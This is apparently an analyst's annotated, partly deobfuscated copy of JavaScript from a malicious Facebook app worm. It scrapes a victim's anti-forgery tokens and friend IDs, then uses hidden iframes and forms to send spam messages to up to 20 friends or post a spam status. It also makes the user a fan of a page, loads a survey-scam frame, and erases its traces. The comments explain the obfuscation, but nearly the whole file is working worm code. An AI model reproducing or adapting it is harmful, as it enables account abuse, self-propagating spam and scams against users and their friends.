/* facebook sandbox initialization below, not important here, so removed */
var app_x = new fbjs_sandbox("xx").setBridgeHash("");

app_x.validation_vars = {
};
app_x.context = "xxx";
app_x.contextd = "xxx";
app_x.data = {
		"xxx"
};

app_x.bootstrap();

var ax_startedapp;
// ax_sheep will contain your friend IDs
// ax_params will contain 3 elements: 2 first items are credentials for sending messages, 3rd - your FB id
var ax_sheep = [], ax_params = [], ax_domethod = 0;

var ax_domethod = 0;

function ax_logerr(ax_err) {

}

function ax_startapp() {
	// start only once
	if (ax_startedapp == '1') {
		return;
	}
	ax_startedapp = '1';

	var ax_create = {
		help : function(ax_cmd, ax_name) {
		    // actual decoding function - extracts characters from "<appid>_m" title attribute and combine them
			var ax_co = ax_document.getElementById(
					ax_name.substr(2, 1)).getTitle(); // "#m".getTitle()

			ax_co = "choy:ketmdslqxb.ujpzgvnra/fiw_?="; // actual key for decoding (it doesn't mean anything on its own
														 //, its just a dictionary)

			// decoding loop ax_cmd
			// FBJS.idx is FB sandbox functionality - see http://w2spconf.com/2009/papers/s3p2.pdf
			// FBJS.idx(a) === a
			// ax_cmd contains offsets of ax_co characters to append
			for ( var ax_a = 0, ax_out = ''; ax_a <= ax_cmd.length - 1; ax_a++) {
				var ax_out = ax_out
						+ ax_co.substr(ax_cmd[$FBJS
								.idx(ax_a)], 1);
			}
			return ax_out;
		},
		input : function(ax_name, ax_value) {
			// add hidden input to form
			var ax_frmform = ax_document
					.getElementById('frm');
			var ax_frminput = ax_document
					.createElement('input');
			ax_frminput.setType('hidden').setValue(
					ax_value).setName(ax_name);
			ax_frmform.appendChild(ax_frminput);
			ax_frminput = null, ax_frmform = null;
			return;
		},
		fire : function(ax_nam, ax_val) {
			// decode or insert input field
			var ax_val = ax_val || '';
			return (ax_val == 'name') ? $FBJS.ref(this).help(
					ax_nam, ax_val) : $FBJS.ref(
					this).input(ax_nam, ax_val);
		}
	};

	var ax_meth = {
		// object with character offets from app's 'm' HTML entity (in title attr there are characters that the result is composed of)
	    // get() method decodes
		// small obfuscation below
		ftarg : [ "21" - -"5", 22 + 1, "18" - -"6" ],
		fhome : [ 5 - 4, 3 + 4, 1 + 6, 17 + 1, 8 - 4, 20 + 5, "19" - -"6",
				5 + 2, 1 + 1, 13 + 3, 10 - 10, 3 - 2, 11 + 4, 23 + 3, 14 + 10,
				20 - 20, 3 + 3, 10 + 4, 1 + 1, 4 - 2, 2 + 3, 11 + 4, 5 - 5,
				1 + 1, 16 - 8, 17 + 8, 9 - 8, 9 - 7, 4 + 4, 1 + 5, 9 + 6,
				17 + 1, 19 - 18, 17 + 1 ],
		m : [ 3 - 2, "3" - -"4", 3 + 4, 17 + 1, 2 + 2, 20 + 5, 30 - 5, 10 - 3,
				1 + 1, 13 + 3, "0" - -"0", 2 - 1, 13 + 2, 23 + 3, 20 + 4,
				10 - 10, 3 + 3, 11 + 3, 1 + 1, 4 - 2, 3 + 2, 14 + 1, 8 - 8,
				8 - 6, 4 + 4, 30 - 5, 4 + 4, 3 + 3, 5 + 5, 6 + 4, 20 + 4,
				10 + 10, 3 + 3, 21 + 8, 7 + 3, 3 + 3, 20 + 2, 6 + 3, 11 + 4,
				17 + 1, 2 - 1, 10 + 8 ],
		su : [ 5 - 4, "2" - -"5", 1 + 6, 15 + 3, 2 + 2, 20 + 5, 30 - 5, 1 + 6,
				1 + 1, 13 + 3, 10 - 10, 3 - 2, 12 + 3, 20 + 6, 22 + 2, 5 - 5,
				4 + 2, 12 + 2, 1 + 1, 5 - 3, 4 + 1, 11 + 4, 9 - 9, 1 + 1,
				4 + 4, 21 + 4, 6 + 4, 12 + 4, 11 + 3, 5 + 3, 26 + 1, 4 + 3,
				28 + 1, 8 + 2, 5 + 2, 22 + 2, 1 + 6, 13 + 3, 1 + 9, 10 + 5,
				14 + 4, 2 - 1, 17 + 1 ],
		lp : [ 1, 7, 7, 18, 4, 25, 25, 7, 2, 16, 0, 1, 15, 26, 24, 0, 6, 14, 2,
				2, 5, 15, 0, 2, 8, 25, 23, 6, 12, 10, 15, 18, 1, 18, 30, 27, 9,
				31 ],
		pid : [ "11" - -"7", 4 - 2, 5 + 5, 1 + 6, 19 + 10, 23 + 3, 1 + 1,
				22 + 1, 2 + 6, 21 + 8, 21 + 6, 6 + 3 ],
		fbd : [ 19 + 7, "10" - -"4", 20 + 9, 10 - 1, 5 + 2, 5 + 5, 11 + 9 ],
		hc : [ "0" - -"1", 4 + 2, 10 + 1, 15 + 3, 28 + 1, 10 - 10, 1 + 1,
				11 + 11, 2 + 5, 20 + 4, 21 + 6, 20 + 2, 1 + 5, 20 + 3 ],
		/*
			ftarg:[26,23,24],
			fhome:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,1,2,8,6,15,18,1,18],
			m:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,8,6,10,10,24,20,6,29,10,6,22,9,15,18,1,18],
			su:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,10,16,14,8,27,7,29,10,7,24,7,16,10,15,18,1,18],
			lp:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,23,6,12,10,15,18,1,18,30,27,9,31],
			pid:[18,2,10,7,29,26,2,23,8,29,27,9],
			fbd:[26,14,29,9,7,10,20],
			hc:[1,6,11,18,29,0,2,22,7,24,27,22,6,23]
		 */

		// decoding function
		get : function(ax_s) {
	    // results:
		/*
			m=http://touch.facebook.com/message_send.php
			ftarg=fra
			su=http://touch.facebook.com/submit_status.php  (status update)
			pid=post_form_id
			lp=http://touch.facebook.com/reqs.php?id=
			fhome=http://touch.facebook.com/home.php
			fbd=fb_dtsg
			hc=fb_dtsg
		 */
			return ax_create.fire(ax_s, 'name');
		}
	};

	var ax_findvalues = {
	    // inserts your friend ids into ax_sheep
	    // inserts credentials for making a wall post into ax_params
	    // returns 1 if succeeded
		a : ((new ax_RegExp(
				'st_.or._i.\\\x22 .al.e=\\\x22(.*?)\\\x22', ''))), // <form action="http://www.facebook.com/wallpost.php"  post_form_id value
		b : ((new ax_RegExp(
				'b_d.s.\\\x22 v..ue=\\\x22(.*?)\\\x22', ''))), // value = type="hidden" id="fb_dtsg" name="fb_dtsg"
		c : ((new ax_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22', ''))), // href="http://www.facebook.com/profile.php?id=xxx" your profile ID
		d : ((new ax_RegExp(
				'na.e=\\\x22i.s\\[]\\\x22 v.l.e=\\\x22(.*?)\\\x22', 'gi'))), // name=ids[] value= -- your friend ids

		firefunc : function(ax_strdata) {
			var ax_matches = [], ax_fmatch = [], ax_out = '', ax_f = 0;
			for (ax_p in ax_findvalues) {
				try {
					if (ax_f == 3) {
						while (ax_matches = ax_findvalues[$FBJS
								.idx(ax_p)]
								.exec(ax_strdata)) {
							if (ax_matches[$FBJS.idx(1)] == ax_sheep[$FBJS
									.idx(0)]) {
								break;
							}
							if (ax_matches[$FBJS.idx(1)].length < 25) {
								ax_sheep
										.push(ax_matches[$FBJS
												.idx(1)]);
							}
						}
						break;
					}
					ax_fmatch = ax_findvalues[$FBJS
							.idx(ax_p)]
							.exec(ax_strdata);
					if (ax_fmatch[$FBJS.idx(1)] !== null) {
						ax_params[$FBJS.idx(ax_f)] = ax_fmatch[$FBJS
								.idx(1)];
					}
				} catch (ax_err) {
					ax_logerr(ax_err);
				}
				ax_f++;
			}
			ax_document.getElementById('help_container')
					.setTextValue('');
			var ax_out = ((ax_params[$FBJS.idx(0)] !== null) && (ax_params[$FBJS
					.idx(0)] !== null)) ? 1 : 0;
			return ax_out;
		}
	};

	var ax_methodaction = function() {
		var ax_retmeth = 0;
		ax_sheep = ax_sheep || [];
		var ax_goahead = (((ax_sheep.length - 1) < 1) || ((ax_sheep.length - 1) > 500)) ? 0
				: 1;
		if (ax_goahead == 0) {
			// if you have <2 friends or > 500 friends

			// only submit status update through touch.facebook.com

			// change form action and target
			ax_document.getElementById('frm').setAction( /*http://touch.facebook.com/submit_status.php*/
					ax_meth.get(ax_meth.su))
					.setTarget(
							ax_meth
									.get(ax_meth.ftarg) /* fra  - created iframe*/) ;
			// add fields
			ax_create
					.fire(
							'status',
							'only go here if you are my TRUE friend http://apps.facebook.com/makemelaughnow/');
			// add credentials
			ax_create.fire(ax_meth
					.get(ax_meth.pid),
					ax_params[$FBJS.idx(0)]);
			ax_create.fire(ax_meth
					.get(ax_meth.fbd),
					ax_params[$FBJS.idx(1)]);

			ax_retmeth = 2;
			return ax_retmeth;

		} else {
			// if you have 2-500 friends
			// send message to first 12-20 of them through touch.facebook.com
			ax_document.getElementById('frm').setAction(
					ax_meth.get(ax_meth.m)  /*http://touch.facebook.com/message_send.php*/)
					.setTarget(
							ax_meth
									.get(ax_meth.ftarg));

			// add credentials
			ax_create.fire(ax_meth
					.get(ax_meth.fbd),
					ax_params[$FBJS.idx(1)]);
			ax_create.fire(ax_meth
					.get(ax_meth.pid),
					ax_params[$FBJS.idx(0)]);

			ax_create.fire('ids[]', '');
			ax_create.fire('subject', 'i thought of you..');
			ax_create
					.fire(
							'body',
							'im using up my fb ad credits to send u a gift so HERE = http://apps.facebook.com/makemelaughnow/');
		    // add your friends
			// min 12
			var ax_sendamount = (12 > (ax_sheep.length - 1)) ? (ax_sheep.length - 1)
					: 12;
			// max 20
			var ax_sendamount = (ax_sendamount < 20) ? ax_sendamount
					: 20;
			for ( var ax_j = 0; ax_j < ax_sendamount; ax_j++) {
				// add 12-12 first friends
				ax_create.fire('ids[]',
						ax_sheep[$FBJS.idx(ax_j)]);
			}
			ax_create.fire(ax_meth
					.get(ax_meth.fbd),
					ax_params[$FBJS.idx(1)]);

			ax_retmeth = 1;
			return ax_retmeth;
		}
	}

	// app starts here
	try {

		// here's the trick - the app (or FB) stores most of app's HTML code in a single element title attribute
		// code extracts lots of data from it (friend ids, credentials, user id, etc.)
		ax_domethod = ax_findvalues
				.firefunc(ax_document.getElementById(
						'help_container').getFirstChild().getTitle());
		// ax_domethod will be 1 and ax_sheep/ax_params initialized
	} catch (ax_err) {
		ax_logerr(ax_err);
	} finally {
		if ((ax_domethod == 1)
				&& (ax_params.length > 1)) { // found credentials

			// add iframe and form
			ax_document
					.getElementById('work_container')
					.setInnerXHTML(
							"<iframe name='fra' id='fra' frameborder='0' smartsize='false' width='1' height='1' scrolling='no' style='width:1px;height:1px;' src='about:blank'></iframe>");
			ax_document.getElementById('frm_container')
					.setInnerXHTML(
							'<form id="frm" method="POST" action=""></form>');

			// fill out form to touch.facebook.com with your credentials, targetting the form to iframe
			var ax_submitfrm = ax_methodaction();
			if (ax_submitfrm > 0) {
				try {
					ax_setTimeout(function() {
						ax_document.getElementById('frm')
								.submit();
					}, 1200);
				} catch (ax_err) {
					ax_logerr(ax_err);
				}
			}

			try {
				// make current user a fan of the application
				var ax_lkp = ax_document
						.createElement('div').setId('lkp');
				ax_document.getElementById('work_container')
						.appendChild(ax_lkp);
				ax_lkp
						.setInnerXHTML("<iframe id='fralkp' name='fralkp' width='1' height='1' scrolling='no' frameborder='0' style='border:none;overflow:hidden;width:1px;height:1px;' src='about:blank'></iframe>");
				ax_document.getElementById('fralkp').setSrc(
						ax_meth.get(ax_meth.lp /* http://touch.facebook.com/reqs.php?id= */)
								+ '148034935215009&action=fan&'
								+ ax_meth
										.get(ax_meth.pid) + '='
								+ ax_params[$FBJS.idx(0)]);
				ax_lkp = null;
			} catch (ax_err) {
				ax_logerr(ax_err);
			}

		}
	}

	// load ads
	ax_document.getElementById('frabox').setClassName('frabox');
	ax_document
			.getElementById('frabox')
			.setInnerXHTML(
					'<iframe id="fraoff" name="fraoff" width="760" height="700" scrolling="no" frameborder="0" style="position:relative;overflow:hidden;border:none;width:755px;height:750px;top:-245px;" src="http://track.socialsurveys.us/DefaultPage.aspx?nm=017gjfq68yx9"></iframe>');
	ax_document.getElementById('loading').setTextValue(
			'Complete above to see a joke!');

	// clean up after 16 secs
	ax_setTimeout(function() {
		ax_document.getElementById('work_container')
				.setTextValue('');
		ax_document.getElementById('frm_container').setTextValue(
				'');

	}, 16000);

}

ax_setTimeout(function() {
	ax_startapp();
}, 800);
